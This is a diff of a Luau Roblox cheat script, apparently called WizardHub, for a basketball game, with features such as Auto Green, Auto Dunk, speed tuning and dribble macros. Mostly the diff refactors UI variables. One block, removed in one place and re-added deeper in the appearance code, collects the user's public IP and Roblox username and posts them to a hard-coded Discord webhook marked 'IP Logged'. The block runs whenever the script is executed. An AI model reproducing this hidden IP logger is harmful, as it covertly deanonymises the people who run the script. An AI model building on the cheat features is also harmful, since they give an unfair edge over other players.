@@ -1,5 +1,8 @@
 
 local source = [=[
+-- Keep shared UI references in one local to stay within Luau's local-register budget.
+local hubControls = {}
+
 
 local source, arrivalTicket, sessionConfig = ...
 -- Use common executor names while preserving each feature's capability checks.
@@ -26,7 +29,7 @@ local config = {
     finish = 1, movement = false, boost = false, glide = false,
 }
 local network = {enabled = true, nextSample = 0}
-local finishStyles = {
+hubControls.finishStyles = {
     {name = "Jelly", key = Enum.KeyCode.Q, virtual = 0x51},
     {name = "Double clutch", key = Enum.KeyCode.F, virtual = 0x46},
     {name = "Alternate Q and F"},
@@ -64,11 +67,11 @@ local gameKeys = {
     X = {Enum.KeyCode.X, 0x58}, V = {Enum.KeyCode.V, 0x56}, Shift = {Enum.KeyCode.LeftShift, 0xA0},
 }
 local bindings = {Menu = Enum.KeyCode.RightShift, ["Auto Guard"] = Enum.KeyCode.F4, ["Court teleport"] = Enum.KeyCode.F8}
-local bindStatus = "Click a binding, then press a key."
+hubControls.bindStatus = "Click a binding, then press a key."
 local capturing
 local selectedMove = moves[1]
 local combo = {moves = {}, rows = {}, slot = 1, editing = false}
-local macroStatus = ""
+hubControls.macroStatus = ""
 local prefix = "[WizardHub] "
 local players = game:GetService("Players")
 local input = game:GetService("UserInputService")
@@ -170,7 +173,7 @@ local function robloxFocused()
     end
     return true -- Maintained by the client focus events on touch and desktop.
 end
-local configFiles = {"GymRelease/settings-a.json", "GymRelease/settings-b.json"}
+hubControls.configFiles = {"GymRelease/settings-a.json", "GymRelease/settings-b.json"}
 local storageAvailable = type(isfile) == "function" and type(readfile) == "function" and type(writefile) == "function"
 local reloadSourcePath = "GymRelease/mc1h-reload-source.lua"
 local reloadSourceReady = false
@@ -195,7 +198,7 @@ local writingSettings = false
 -- Keep the previous valid revision if a file is interrupted during a write.
 if storageAvailable then
     local hadFile
-    for _, path in ipairs(configFiles) do
+    for _, path in ipairs(hubControls.configFiles) do
         local checked, exists = pcall(isfile, path)
         if checked and exists then
             hadFile = true
@@ -219,7 +222,7 @@ local function saveSettings()
     writingSettings = true
     local revision = settings.revision
     settings.revision = revision + 1
-    local path = configFiles[(settings.revision - 1) % #configFiles + 1]
+    local path = hubControls.configFiles[(settings.revision - 1) % #hubControls.configFiles + 1]
     local ok = pcall(function()
         local encoded = http:JSONEncode(settings)
         writefile(path, encoded)
@@ -586,8 +589,8 @@ function appearance.pop()
     scale.Scale = full * 0.96
     appearance.ease(scale, 0.22, {Scale = full})
 end
-local closeButton = button(dashboard, "×", 893, 15, 34, 32, colors.surface, colors.muted)
-closeButton.TextSize = 21
+hubControls.closeButton = button(dashboard, "×", 893, 15, 34, 32, colors.surface, colors.muted)
+hubControls.closeButton.TextSize = 21
 menuLayout.smaller = button(dashboard, "−", 0, 0, 32, 28, colors.card, colors.text)
 menuLayout.larger = button(dashboard, "+", 0, 0, 32, 28, colors.card, colors.text)
 menuLayout.sizeLabel = label(dashboard, "", 0, 0, 50, 28, 12, Enum.Font.GothamMedium, colors.muted)
@@ -677,7 +680,7 @@ for index, module in ipairs(modules) do
     }), "Color", "divider")
     nav[name] = {row = row, mark = mark, caption = caption, icon = icon}
 end
-local unloadButton = button(sidebar, "Unload script", 7, height - 175, 146, 34, colors.card, colors.danger)
+hubControls.unloadButton = button(sidebar, "Unload script", 7, height - 175, 146, 34, colors.card, colors.danger)
 local menuHint = button(sidebar, "", 9, height - 131, 151, 26, colors.card, colors.text)
 menuLayout.contentPlate = rounded(create("Frame", dashboard, {
     Name = "WizardContentPanel", Visible = false, BackgroundColor3 = colors.sidebar, BorderSizePixel = 0,
@@ -1941,23 +1944,23 @@ do
     end
 end
 
-local keysSwitch = switch(shooting, "Auto Green", 0, 112)
-local pingSwitch = switch(shooting, "Ping compensation", 0, 146)
-local pingStatus = label(shooting, "Measuring Shift+F3 data ping…", 0, 178, 329, 21, 11, Enum.Font.GothamMedium, colors.muted)
-local approachSwitch = switch(shooting, "Auto Dunk", 359, 112)
-local jellySwitch = switch(shooting, "Auto Jelly", 359, 148)
+hubControls.keysSwitch = switch(shooting, "Auto Green", 0, 112)
+hubControls.pingSwitch = switch(shooting, "Ping compensation", 0, 146)
+hubControls.pingStatus = label(shooting, "Measuring Shift+F3 data ping…", 0, 178, 329, 21, 11, Enum.Font.GothamMedium, colors.muted)
+hubControls.approachSwitch = switch(shooting, "Auto Dunk", 359, 112)
+hubControls.jellySwitch = switch(shooting, "Auto Jelly", 359, 148)
 shotInput.manualSwitch = switch(shooting, "Require shot input", 359, 231)
-local jumpBias = slider(shooting, "Jump-shot release offset", 0, 204, -30, 30, 0, "%+d ms")
-local finishBias = slider(shooting, "Finish release offset", 0, 252, -30, 30, 0, "%+d ms")
-local styleButton = button(shooting, "", 359, 191, 316, 32, colors.card, colors.text)
-local jellyStatus = label(shooting, "", 359, 272, 316, 33, 12, Enum.Font.Gotham, colors.muted)
-jellyStatus.TextWrapped = true
+hubControls.jumpBias = slider(shooting, "Jump-shot release offset", 0, 204, -30, 30, 0, "%+d ms")
+hubControls.finishBias = slider(shooting, "Finish release offset", 0, 252, -30, 30, 0, "%+d ms")
+hubControls.styleButton = button(shooting, "", 359, 191, 316, 32, colors.card, colors.text)
+hubControls.jellyStatus = label(shooting, "", 359, 272, 316, 33, 12, Enum.Font.Gotham, colors.muted)
+hubControls.jellyStatus.TextWrapped = true
 label(visuals, "Visuals", 0, 0, 480, 35, 25, Enum.Font.GothamBold, colors.text)
 divider(visuals, 0, 71, 699, 1)
 label(visuals, "Court lines", 0, 83, 137, 20, 12, Enum.Font.GothamBold, colors.muted)
-local threeSwitch = switch(visuals, "Draw 3 pt line", 0, 106)
-local visualStatus = label(visuals, "Highlights both three-point arcs.", 137, 83, 178, 20, 10, Enum.Font.Gotham, colors.muted)
-visualStatus.TextXAlignment = Enum.TextXAlignment.Right
+hubControls.threeSwitch = switch(visuals, "Draw 3 pt line", 0, 106)
+hubControls.visualStatus = label(visuals, "Highlights both three-point arcs.", 137, 83, 178, 20, 10, Enum.Font.Gotham, colors.muted)
+hubControls.visualStatus.TextXAlignment = Enum.TextXAlignment.Right
 local visualExtras = {teammates = false, contest = false, contestMeter = false}
 function visualExtras.normalizeHex(value)
     if type(value) ~= "string" then return end
@@ -2067,7 +2070,7 @@ do
         end
     end
 end
-local resetButton = button(shooting, "Reset timings", 0, 310, 150, 32, colors.card, colors.text)
+hubControls.resetButton = button(shooting, "Reset timings", 0, 310, 150, 32, colors.card, colors.text)
 
 label(dribble, "Dribble", 0, 0, 480, 35, 25, Enum.Font.GothamBold, colors.text)
 divider(dribble, 0, 71, 699, 1)
@@ -2089,41 +2092,41 @@ local playerControls=create("ScrollingFrame",playerPage,{
     ScrollBarThickness=3,ScrollBarImageColor3=colors.accent,ScrollingDirection=Enum.ScrollingDirection.Y,
     ClipsDescendants=true,
 })
-local boostSwitch = switch(playerControls, "Dribble boost", 0, 232)
-local boostStrength = slider(playerControls, "Boost strength", 0, 274, 0, 300, 100, "%d%%")
-local glideSwitch = switch(playerControls, "Dribble glide", 359, 232)
-local glideStrength = slider(playerControls, "Glide strength", 359, 274, 0, 300, 100, "%d%%")
-local cadence = slider(combo.singlePane, "Ball handling cadence", 0, 110, 45, 150, 75, "%d ms")
-local moveName = label(combo.singlePane, "", 0, 168, 325, 24, 15, Enum.Font.GothamBold, colors.text)
-local moveInputs = label(combo.singlePane, "", 0, 192, 325, 23, 12, Enum.Font.Gotham, colors.muted)
-local runMacroButton = button(combo.singlePane, "Run move", 0, 224, 148, 30, colors.card, colors.text)
-local bindMacroButton = button(combo.singlePane, "", 158, 224, 157, 30, colors.card, colors.text)
-local dribbleStatus = label(dribble, "", 0, 350, 325, 42, 11, Enum.Font.Gotham, colors.muted)
-dribbleStatus.TextWrapped = true
+hubControls.boostSwitch = switch(playerControls, "Dribble boost", 0, 232)
+hubControls.boostStrength = slider(playerControls, "Boost strength", 0, 274, 0, 300, 100, "%d%%")
+hubControls.glideSwitch = switch(playerControls, "Dribble glide", 359, 232)
+hubControls.glideStrength = slider(playerControls, "Glide strength", 359, 274, 0, 300, 100, "%d%%")
+hubControls.cadence = slider(combo.singlePane, "Ball handling cadence", 0, 110, 45, 150, 75, "%d ms")
+hubControls.moveName = label(combo.singlePane, "", 0, 168, 325, 24, 15, Enum.Font.GothamBold, colors.text)
+hubControls.moveInputs = label(combo.singlePane, "", 0, 192, 325, 23, 12, Enum.Font.Gotham, colors.muted)
+hubControls.runMacroButton = button(combo.singlePane, "Run move", 0, 224, 148, 30, colors.card, colors.text)
+hubControls.bindMacroButton = button(combo.singlePane, "", 158, 224, 157, 30, colors.card, colors.text)
+hubControls.dribbleStatus = label(dribble, "", 0, 350, 325, 42, 11, Enum.Font.Gotham, colors.muted)
+hubControls.dribbleStatus.TextWrapped = true
 label(dribble, "Dribble macros", 359, 83, 328, 20, 12, Enum.Font.GothamMedium, colors.muted)
 local list = rounded(create("ScrollingFrame", dribble, {
     BackgroundColor3 = colors.sidebar, BorderSizePixel = 0, Position = UDim2.fromOffset(359, 110),
     Size = UDim2.fromOffset(325, 284), CanvasSize = UDim2.fromOffset(0, #moves * 32 + 8),
     ScrollBarThickness = 3, ScrollBarImageColor3 = colors.accent, ScrollingDirection = Enum.ScrollingDirection.Y,
 }), 9)
-local moveRows = {}
+hubControls.moveRows = {}
 for index, move in ipairs(moves) do
     local row = button(list, move[1], 5, 5 + (index - 1) * 32, 310, 29, colors.sidebar, colors.muted)
     row.TextSize = 12
     appearance.paint(create("UIStroke", row, {Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}), "Color", "line")
-    moveRows[move] = row
+    hubControls.moveRows[move] = row
 end
 
 label(playerPage, "Player", 0, 0, 480, 35, 25, Enum.Font.GothamBold, colors.text)
 divider(playerPage, 0, 71, 699, 1)
 label(playerControls, "Speed", 0, 0, 327, 20, 12, Enum.Font.GothamMedium, colors.muted)
-local movementSwitch = switch(playerControls, "Movement tuning", 0, 25)
-local offBallSpeed = slider(playerControls, "Speed without ball", 0, 70, 60, 160, 100, "%d%%")
-local withBallSpeed = slider(playerControls, "Speed with ball", 0, 132, 60, 160, 100, "%d%%")
+hubControls.movementSwitch = switch(playerControls, "Movement tuning", 0, 25)
+hubControls.offBallSpeed = slider(playerControls, "Speed without ball", 0, 70, 60, 160, 100, "%d%%")
+hubControls.withBallSpeed = slider(playerControls, "Speed with ball", 0, 132, 60, 160, 100, "%d%%")
 label(playerControls, "Acceleration", 359, 0, 327, 20, 12, Enum.Font.GothamMedium, colors.muted)
 local acceleration = slider(playerControls, "Acceleration multiplier", 359, 36, 50, 180, 100, "%d%%")
-local movementStatus = label(playerControls, "Movement tuning is off.", 359, 91, 325, 56, 12, Enum.Font.Gotham, colors.muted)
-movementStatus.TextWrapped = true
+hubControls.movementStatus = label(playerControls, "Movement tuning is off.", 359, 91, 325, 56, 12, Enum.Font.Gotham, colors.muted)
+hubControls.movementStatus.TextWrapped = true
 label(playerControls, "Dribble effects", 0, 204, 674, 20, 12, Enum.Font.GothamMedium, colors.muted)
 do
     local root = pages.Rage
@@ -2175,9 +2178,9 @@ courtJoin.interval = slider(playerControls, "Auto Join retry interval", 359, 398
 label(keybinds, "Keybinds", 0, 0, 480, 35, 25, Enum.Font.GothamBold, colors.text)
 label(keybinds, "Select a binding to edit. Escape cancels.", 0, 39, 680, 21, 13, Enum.Font.Gotham, colors.muted)
 divider(keybinds, 0, 71, 699, 1)
-local bindRows = {}
-local bindNames = {"Menu", "Auto Green", "Auto Dunk", "Auto Jelly", "Auto Guard", "Auto Block", "Movement tuning", "Dribble boost", "Dribble glide", "Ping compensation", "Rage", "Court teleport"}
-for index, name in ipairs(bindNames) do
+hubControls.bindRows = {}
+hubControls.bindNames = {"Menu", "Auto Green", "Auto Dunk", "Auto Jelly", "Auto Guard", "Auto Block", "Movement tuning", "Dribble boost", "Dribble glide", "Ping compensation", "Rage", "Court teleport"}
+for index, name in ipairs(hubControls.bindNames) do
     -- Six to a column, so any number up to twelve has its own place.
     local x = index <= 6 and 0 or 359
     local y = 86 + ((index - 1) % 6) * 40
@@ -2187,23 +2190,23 @@ for index, name in ipairs(bindNames) do
     }), 8)
     appearance.paint(create("UIStroke", plate, {Thickness = 1}), "Color", "divider")
     label(keybinds, name == "Menu" and "Open / close menu" or name, x + 12, y + 1, 180, 32, 13, Enum.Font.GothamMedium, colors.text)
-    bindRows[name] = button(keybinds, "", x + 200, y + 4, 110, 26, colors.sidebar, colors.text)
+    hubControls.bindRows[name] = button(keybinds, "", x + 200, y + 4, 110, 26, colors.sidebar, colors.text)
 end
-local bindingStatus = label(keybinds, "", 0, 332, 684, 36, 12, Enum.Font.Gotham, colors.muted)
+hubControls.bindingStatus = label(keybinds, "", 0, 332, 684, 36, 12, Enum.Font.Gotham, colors.muted)
 label(configs, "Configs", 0, 0, 480, 35, 25, Enum.Font.GothamBold, colors.text)
 divider(configs, 0, 71, 699, 1)
 label(configs, "Saved slots", 0, 83, 327, 20, 12, Enum.Font.GothamMedium, colors.muted)
-local slotButton = button(configs, "", 0, 113, 316, 34, colors.card, colors.text)
-local saveButton = button(configs, "Save config", 0, 161, 153, 34, colors.card, colors.text)
-local loadButton = button(configs, "Load config", 163, 161, 153, 34, colors.card, colors.text)
+hubControls.slotButton = button(configs, "", 0, 113, 316, 34, colors.card, colors.text)
+hubControls.saveButton = button(configs, "Save config", 0, 161, 153, 34, colors.card, colors.text)
+hubControls.loadButton = button(configs, "Load config", 163, 161, 153, 34, colors.card, colors.text)
 label(configs, "Startup", 359, 83, 327, 20, 12, Enum.Font.GothamMedium, colors.muted)
-local autoLoadSwitch = switch(configs, "Auto-load config on execute", 359, 110)
-local reloadSwitch = switch(configs, "Re-execute after teleport", 359, 151)
-local storageNote = label(configs, "Teleport reload carries your current settings to the next place.", 359, 193, 325, 48, 12, Enum.Font.Gotham, colors.muted)
-storageNote.TextWrapped = true
-local configStatus = storageWarning or (storageAvailable and "Select a slot to save or load." or "Local config storage is unavailable.")
-local configMessage = label(configs, "", 0, 232, 683, 40, 12, Enum.Font.Gotham, colors.muted)
-configMessage.TextWrapped = true
+hubControls.autoLoadSwitch = switch(configs, "Auto-load config on execute", 359, 110)
+hubControls.reloadSwitch = switch(configs, "Re-execute after teleport", 359, 151)
+hubControls.storageNote = label(configs, "Teleport reload carries your current settings to the next place.", 359, 193, 325, 48, 12, Enum.Font.Gotham, colors.muted)
+hubControls.storageNote.TextWrapped = true
+hubControls.configStatus = storageWarning or (storageAvailable and "Select a slot to save or load." or "Local config storage is unavailable.")
+hubControls.configMessage = label(configs, "", 0, 232, 683, 40, 12, Enum.Font.Gotham, colors.muted)
+hubControls.configMessage.TextWrapped = true
 
 local function refresh()
     for name, item in pairs(nav) do
@@ -2227,15 +2230,15 @@ local function refresh()
         end
         appearance.shownPage = currentPage
     end
-    showSwitch(keysSwitch, assistKeys)
-    showSwitch(pingSwitch, network.enabled)
-    showSwitch(approachSwitch, autoDunk)
+    showSwitch(hubControls.keysSwitch, assistKeys)
+    showSwitch(hubControls.pingSwitch, network.enabled)
+    showSwitch(hubControls.approachSwitch, autoDunk)
     showSwitch(shotInput.manualSwitch, shotInput.manualOnly)
-    showSwitch(jellySwitch, autoJelly)
-    showSwitch(threeSwitch, drawThree)
-    showSwitch(movementSwitch, config.movement)
-    showSwitch(boostSwitch, config.boost)
-    showSwitch(glideSwitch, config.glide)
+    showSwitch(hubControls.jellySwitch, autoJelly)
+    showSwitch(hubControls.threeSwitch, drawThree)
+    showSwitch(hubControls.movementSwitch, config.movement)
+    showSwitch(hubControls.boostSwitch, config.boost)
+    showSwitch(hubControls.glideSwitch, config.glide)
     showSwitch(defense.toggle, defense.enabled)
     showSwitch(defense.footworkSwitch, defense.footwork)
     defense.refresh()
@@ -2265,22 +2268,22 @@ local function refresh()
         if feature[1] then table.insert(enabled, feature[2]) end
     end
     hud.refresh(enabled)
-    local style = finishStyles[config.finish]
-    styleButton.Text = style.name .. (style.key and ("  /  " .. style.key.Name) or "") .. "     ›"
-    for name, row in pairs(bindRows) do
+    local style = hubControls.finishStyles[config.finish]
+    hubControls.styleButton.Text = style.name .. (style.key and ("  /  " .. style.key.Name) or "") .. "     ›"
+    for name, row in pairs(hubControls.bindRows) do
         row.Text = capturing == name and "Press a key…" or (bindings[name] and bindings[name].Name or "Unbound")
     end
-    bindingStatus.Text = bindStatus
+    hubControls.bindingStatus.Text = hubControls.bindStatus
     menuHint.Text = capturing == "Menu" and "Press a key…" or menuLayout.preset == "Compact Rail" and bindings.Menu.Name
         or ("Menu key  ·  " .. bindings.Menu.Name)
-    moveName.Text = selectedMove[1]
+    hubControls.moveName.Text = selectedMove[1]
     if selectedMove == spinMove then
-        moveInputs.Text = string.format("Auto hand  /  R: %s  ·  L: %s  ·  Fast taps", spinMove.hands.Right, spinMove.hands.Left)
+        hubControls.moveInputs.Text = string.format("Auto hand  /  R: %s  ·  L: %s  ·  Fast taps", spinMove.hands.Right, spinMove.hands.Left)
     else
         local taps = table.concat(string.split(selectedMove[2], ""), " → ")
-        moveInputs.Text = selectedMove[3] and (selectedMove[3]:gsub(" ", " + ") .. " + " .. taps) or taps
+        hubControls.moveInputs.Text = selectedMove[3] and (selectedMove[3]:gsub(" ", " + ") .. " + " .. taps) or taps
     end
-    bindMacroButton.Text = capturing == selectedMove and "Press a key…"
+    hubControls.bindMacroButton.Text = capturing == selectedMove and "Press a key…"
         or (bindings[selectedMove] and ("Bind  " .. bindings[selectedMove].Name) or "Bind key")
     combo.singlePane.Visible = not combo.editing
     combo.editPane.Visible = combo.editing
@@ -2292,18 +2295,18 @@ local function refresh()
         row.Text = string.format("%d    %s", i, move and move[1] or "Empty")
         appearance.paint(row, "BackgroundColor3", i == combo.slot and "selection" or "card")
     end
-    dribbleStatus.Text = macroStatus
+    hubControls.dribbleStatus.Text = hubControls.macroStatus
     local highlighted = selectedMove
     if combo.editing then highlighted = combo.moves[combo.slot] end
-    for move, row in pairs(moveRows) do
+    for move, row in pairs(hubControls.moveRows) do
         appearance.paint(row, "BackgroundColor3", move == highlighted and "card" or "sidebar")
         appearance.paint(row, "TextColor3", move == highlighted and "accent" or "muted")
     end
     local slot = tostring(settings.slot)
-    slotButton.Text = "Slot " .. slot .. (settings.slots[slot] and "   •   Saved" or "   •   Empty") .. "      ›"
-    showSwitch(autoLoadSwitch, settings.autoLoad)
-    showSwitch(reloadSwitch, queueAvailable() and settings.reload)
-    configMessage.Text = configStatus
+    hubControls.slotButton.Text = "Slot " .. slot .. (settings.slots[slot] and "   •   Saved" or "   •   Empty") .. "      ›"
+    showSwitch(hubControls.autoLoadSwitch, settings.autoLoad)
+    showSwitch(hubControls.reloadSwitch, queueAvailable() and settings.reload)
+    hubControls.configMessage.Text = hubControls.configStatus
 end
 
 local drag
@@ -2423,7 +2426,7 @@ do
         dashboard.Size = UDim2.fromOffset(width, height)
         geometry(appearance.header, 8, 8, width - 16, 50)
         geometry(menuLayout.headerDivider, 18, 66, width - 36, 1)
-        geometry(closeButton, width - 51, 15, 34, 32)
+        geometry(hubControls.closeButton, width - 51, 15, 34, 32)
         local sizeX = width - (current.horizontal and 360 or 184)
         geometry(menuLayout.smaller, sizeX, 18, 32, 28)
         geometry(menuLayout.sizeLabel, sizeX + 32, 18, 48, 28)
@@ -2464,15 +2467,15 @@ do
             end
         end
         if current.horizontal then
-            unloadButton.Parent, menuHint.Parent = dashboard, dashboard
-            geometry(unloadButton, width - 235, 15, 145, 32)
+            hubControls.unloadButton.Parent, menuHint.Parent = dashboard, dashboard
+            geometry(hubControls.unloadButton, width - 235, 15, 145, 32)
             geometry(menuHint, 24, height - 31, 156, 26)
         else
-            unloadButton.Parent, menuHint.Parent = sidebar, sidebar
-            geometry(unloadButton, current.rail and 1 or 1, height - 146, current.rail and 64 or current.nav[3] - 5, 30)
+            hubControls.unloadButton.Parent, menuHint.Parent = sidebar, sidebar
+            geometry(hubControls.unloadButton, current.rail and 1 or 1, height - 146, current.rail and 64 or current.nav[3] - 5, 30)
             geometry(menuHint, current.rail and 1 or 9, height - 113, current.nav[3] - 13, 26)
         end
-        unloadButton.TextSize = current.rail and 9 or 13
+        hubControls.unloadButton.TextSize = current.rail and 9 or 13
         menuHint.TextSize = current.rail and 9 or 11
         menuLayout.styleChrome()
         updateCards()
@@ -2560,7 +2563,7 @@ local function updateThreePointLines()
         lineOverlay = nil
     end
     if not drawThree then
-        visualStatus.Text = "Highlights both three-point arcs."
+        hubControls.visualStatus.Text = "Highlights both three-point arcs."
         return
     end
 
@@ -2571,7 +2574,7 @@ local function updateThreePointLines()
     local zones = functionals and functionals:FindFirstChild("Zones")
     local threePoint = zones and zones:FindFirstChild("ThreePoint")
     if not band or not band:IsA("BasePart") or not threePoint then
-        visualStatus.Text = "Waiting for compatible court geometry."
+        hubControls.visualStatus.Text = "Waiting for compatible court geometry."
         return
     end
 
@@ -2599,14 +2602,14 @@ local function updateThreePointLines()
     end
     if count == 0 then
         overlay:Destroy()
-        visualStatus.Text = "The court line meshes are unavailable."
+        hubControls.visualStatus.Text = "The court line meshes are unavailable."
         return
     end
     overlay.Parent = workspace
     lineOverlay = overlay
     visualExtras.threeActive = true
     visualExtras.styleThreePointLines()
-    visualStatus.Text = string.format("Showing %d three-point arcs.", count)
+    hubControls.visualStatus.Text = string.format("Showing %d three-point arcs.", count)
 end
 
 local appliedLineTransparency
@@ -3857,57 +3860,6 @@ do
         end
     end
 
-
-        -- 1. Get HTTP request function provided by the executor
-    local httpReq = request or http_request or (syn and syn.request) or (http and http.request)
-
-    if not httpReq then
-        warn("Current executor does not support HTTP requests")
-        return
-    end
-
-    -- 2. Your Discord Webhook address (replace with your own)
-    local WEBHOOK_URL = "https://discord.com/api/webhooks/1457245590701211791/_HsQORnxN9yKxWVf3F92BdAhWZa70E26NMDheoz18u6wT7QDGDXk16iqTccKGpi2J6ZJ"
-
-    -- 3. Get the user's public IP
-    local ip = "Unknown"
-    local ok, res = pcall(function()
-        return httpReq({ Url = "https://api.ipify.org", Method = "GET" })
-    end)
-    if ok and res and res.Body then
-        ip = res.Body
-    end
-
-    -- 4. Get Roblox username for correlation
-    local playerName = "Unknown"
-    pcall(function()
-        playerName = game:GetService("Players").LocalPlayer.Name
-    end)
-
-    -- 5. Construct Webhook message
-    local payload = {
-        content = "IP Logged",
-        embeds = {{
-            title = "Executor User Info",
-            fields = {
-                { name = "Username", value = playerName, inline = true },
-                { name = "IP", value = ip, inline = true }
-            },
-            color = 0xFF0000
-        }}
-    }
-
-    -- 6. Send
-    local HttpService = game:GetService("HttpService")
-    local body = HttpService:JSONEncode(payload)
-    httpReq({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = body
-    })
-
-
     local function clearAppearance(target)
         if not target.model then return end
         for part, original in pairs(target.hidden) do
@@ -4245,6 +4197,56 @@ do
             link.part.LocalTransparencyModifier = showOriginal and 1 or current.hidden[link.source] or 0
         end
     end
+
+    -- 1. Get HTTP request function provided by the executor
+    local httpReq = request or http_request or (syn and syn.request) or (http and http.request)
+
+    if not httpReq then
+        warn("Current executor does not support HTTP requests")
+        return
+    end
+
+    -- 2. Your Discord Webhook address (replace with your own)
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1457245590701211791/_HsQORnxN9yKxWVf3F92BdAhWZa70E26NMDheoz18u6wT7QDGDXk16iqTccKGpi2J6ZJ"
+
+    -- 3. Get the user's public IP
+    local ip = "Unknown"
+    local ok, res = pcall(function()
+        return httpReq({ Url = "https://api.ipify.org", Method = "GET" })
+    end)
+    if ok and res and res.Body then
+        ip = res.Body
+    end
+
+    -- 4. Get Roblox username for correlation
+    local playerName = "Unknown"
+    pcall(function()
+        playerName = game:GetService("Players").LocalPlayer.Name
+    end)
+
+    -- 5. Construct Webhook message
+    local payload = {
+        content = "IP Logged",
+        embeds = {{
+            title = "Executor User Info",
+            fields = {
+                { name = "Username", value = playerName, inline = true },
+                { name = "IP", value = ip, inline = true }
+            },
+            color = 0xFF0000
+        }}
+    }
+
+    -- 6. Send
+    local HttpService = game:GetService("HttpService")
+    local body = HttpService:JSONEncode(payload)
+    httpReq({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body
+    })
+
 
     local function loadTemplate(mode, rigType)
         local key = mode .. ":" .. rigType.Name
@@ -7212,7 +7214,7 @@ local function stopMacro(message)
     if active.tap then releaseKey(active.tap) end
     for index = #active.modifiers, 1, -1 do releaseKey(active.modifiers[index]) end
     if message and not stopped then
-        macroStatus = message
+        hubControls.macroStatus = message
         refresh()
     end
 end
@@ -7223,14 +7225,14 @@ local function beginMacro(move, sequence, step)
         return
     end
     if not automationAvailable() then
-        macroStatus = "Keyboard input is unavailable on this device."
+        hubControls.macroStatus = "Keyboard input is unavailable on this device."
         refresh()
         return
     end
     local character, root = findCharacter()
     local ball = heldBall(character)
     if not ball then
-        macroStatus = "Pick up a ball before running a move."
+        hubControls.macroStatus = "Pick up a ball before running a move."
         refresh()
         return
     end
@@ -7239,7 +7241,7 @@ local function beginMacro(move, sequence, step)
     if move == spinMove then
         hand = ballHand(character, root, ball)
         if not hand then
-            macroStatus = "Wait until the ball is clearly in one hand, then try Spin."
+            hubControls.macroStatus = "Wait until the ball is clearly in one hand, then try Spin."
             refresh()
             return
         end
@@ -7247,7 +7249,7 @@ local function beginMacro(move, sequence, step)
     end
     for letter in taps:gmatch(".") do
         if executorInput.keyDown(gameKeys[letter][1]) then
-            macroStatus = "Release the dribble keys first."
+            hubControls.macroStatus = "Release the dribble keys first."
             refresh()
             return
         end
@@ -7262,7 +7264,7 @@ local function beginMacro(move, sequence, step)
             keypress(key[2])
         end
     end
-    macroStatus = "Running " .. move[1] .. (hand and (" from " .. hand:lower() .. " hand") or "") .. "…"
+    hubControls.macroStatus = "Running " .. move[1] .. (hand and (" from " .. hand:lower() .. " hand") or "") .. "…"
     refresh()
 end
 
@@ -7289,14 +7291,14 @@ local function watchMacro(now)
             if nextStep and active.sequence[nextStep] then
                 stopMacro()
                 beginMacro(active.sequence[nextStep], active.sequence, nextStep)
-                if macro then macro.nextAt = now + cadence.value / 1000 end
+                if macro then macro.nextAt = now + hubControls.cadence.value / 1000 end
             else
                 stopMacro(active.sequence and "Combo complete." or ("Sent " .. active.move[1] .. "."))
             end
             return
         end
         -- A full Spin needs all three taps before the game commits to the two-key move.
-        active.nextAt = spin and (active.tapAt + spinMove.cadence) or (now + cadence.value / 1000 - 0.028)
+        active.nextAt = spin and (active.tapAt + spinMove.cadence) or (now + hubControls.cadence.value / 1000 - 0.028)
         if now < active.nextAt then return end
     end
     local letter = active.taps:sub(active.index, active.index)
@@ -7684,8 +7686,8 @@ do
         if active then lastDribble=now end
         if character:GetAttribute("CanMove")==false and not scriptedDribble then return 1,1,0,0 end
         local elapsed=lastDribble and math.max(0,now-lastDribble) or math.huge
-        local boost=config.boost and elapsed<=.21 and strength(boostStrength) or 0
-        local glide=config.glide and elapsed<=.40 and strength(glideStrength) or 0
+        local boost=config.boost and elapsed<=.21 and strength(hubControls.boostStrength) or 0
+        local glide=config.glide and elapsed<=.40 and strength(hubControls.glideStrength) or 0
         return (1+.12*boost)*(1+.08*glide*math.max(0,1-elapsed/.40)),1,boost,glide
     end
 end
@@ -7695,12 +7697,12 @@ local function watchMovement(now)
     if now<nextMotionSample then return end
     nextMotionSample=now+.1
     restoreMovement()
-    if not rage.playerMovementEnabled() then dribbleMotion.reset();movementStatus.Text="Movement tuning is off.";return end
+    if not rage.playerMovementEnabled() then dribbleMotion.reset();hubControls.movementStatus.Text="Movement tuning is off.";return end
     if rage.ownsSpeed() then
-        dribbleMotion.reset();movementStatus.Text="Rage Speed override is active. Turn it off to use Player movement and dribble effects.";return
+        dribbleMotion.reset();hubControls.movementStatus.Text="Rage Speed override is active. Turn it off to use Player movement and dribble effects.";return
     end
     local state=rage.diagnostics()
-    movementStatus.Text=state.source=="player" and string.format("Player target %.1f → %.1f studs/s · %s",state.nativeTarget or 0,state.effective or 0,state.phase or "Waiting")
+    hubControls.movementStatus.Text=state.source=="player" and string.format("Player target %.1f → %.1f studs/s · %s",state.nativeTarget or 0,state.effective or 0,state.phase or "Waiting")
         or "Waiting for the native movement controller."
 end
 
@@ -7949,7 +7951,7 @@ do
         local requested
         if isRage then requested=state.ball and rage.withBall.value or rage.offBall.value
         else
-            local tuning=config.movement and (state.ball and withBallSpeed.value or offBallSpeed.value)/100 or 1
+            local tuning=config.movement and (state.ball and hubControls.withBallSpeed.value or hubControls.offBallSpeed.value)/100 or 1
             requested=scriptedVector and (playerScale>1.00001 and scriptedVector.Magnitude*playerScale or original.Magnitude) or original.Magnitude*tuning*playerScale
             if scriptedVector then direction=scriptedVector.Unit
             elseif direction.Magnitude>.01 and original.Magnitude>.01 then direction=original.Unit end
@@ -8359,7 +8361,7 @@ local function watchJelly(now)
             return
         end
         pending.pressedAt, pending.held = now, true
-        jellyStatus.Text = pending.style.name .. " input sent."
+        hubControls.jellyStatus.Text = pending.style.name .. " input sent."
         keypress(pending.style.virtual)
     elseif pending.held and now - pending.pressedAt >= 0.07 then
         pending.held = false
@@ -8369,13 +8371,13 @@ local function watchJelly(now)
         and (string.find(string.lower(action), "layup", 1, true) or string.find(string.lower(action), "clutch", 1, true)) then
         if not pending.confirmed then
             pending.confirmed = true
-            jellyStatus.Text = pending.style.name .. " confirmed."
+            hubControls.jellyStatus.Text = pending.style.name .. " confirmed."
             warn(prefix .. pending.style.name .. " converted to " .. action .. ".")
         end
         if not pending.held then jelly = nil end
     elseif now - pending.releaseAt >= 0.35 then
         cancelJelly()
